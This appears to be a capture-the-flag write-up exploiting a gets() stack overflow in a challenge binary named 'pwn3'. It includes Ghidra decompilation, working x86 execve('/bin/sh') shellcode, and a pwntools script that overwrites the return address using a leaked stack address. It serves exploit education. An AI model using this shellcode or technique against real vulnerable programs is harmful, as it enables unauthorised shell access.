In Ghidra:
```c
undefined4 main(undefined1 param_1)
{
  setvbuf(_stdout,(char *)0x2,0,0);
  echo();
  return 0;
}
```

Following this to the `echo()` function we see called:
```c
void echo(void)
{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

Here we immediately see the use of `gets`, which becomes a buffer overflow vulnerability. We can save shellcode to pop a shell in `local_12e`, then overwrite the return address of `echo`.

The following shellcode is from https://shell-storm.org/shellcode/files/shellcode-827.html. **It runs execve(/bin/sh), popping a shell, on linux x86 systems**:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

^d5057a

Knowing all of this, we can write our exploit:
```python
from pwn import process, p32

target = process("pwn3")
target.recvuntil("Take this, you might need it on your journey ")
addr = int(target.recvline().strip(b"!\n"), 16)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = shellcode
payload += b"\x00" * (0x12e - len(shellcode))
payload += p32(addr)

target.send(payload)
target.interactive()
```